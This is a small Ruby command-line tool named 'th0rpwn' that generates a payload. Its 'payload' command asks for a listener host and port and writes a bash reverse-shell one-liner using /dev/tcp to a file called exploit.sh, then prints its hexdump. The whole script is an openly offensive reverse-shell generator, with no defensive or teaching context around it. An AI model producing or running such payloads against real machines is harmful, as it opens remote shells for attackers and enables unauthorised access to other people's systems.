#!/usr/bin/env ruby

e = "\033[1;31m[-] \033[0m"
p = "\033[1;77m[>] \033[0m"
g = "\033[1;34m[*] \033[0m"
s = "\033[1;32m[+] \033[0m"
h = "\033[1;77m[@] \033[0m"

loop do
print "(th0rpwn)> "
c = gets.chomp
if c == "exit"
    abort()
    
elsif c == "help"
    puts "payload => Generate payload"
    puts "exit    => Exit th0rpwn"
    puts "help    => Show help"

elsif c == "payload"
    print "#{p}Local Host: "
    host = gets.chomp
    print "#{p}Local Port: "
    port = gets.chomp
    puts "#{g}Writing payload..."
    open('exploit.sh', 'w') { |f|
        f.puts "bash &> /dev/tcp/#{host}/#{port} 0>&1"
    }
    puts "#{h}Output raw payload:"
    system("hexdump exploit.sh")
    puts "#{s}Saved to exploit.sh!"
    abort()
else
    puts "#{e}Urecognized command" 
end
end
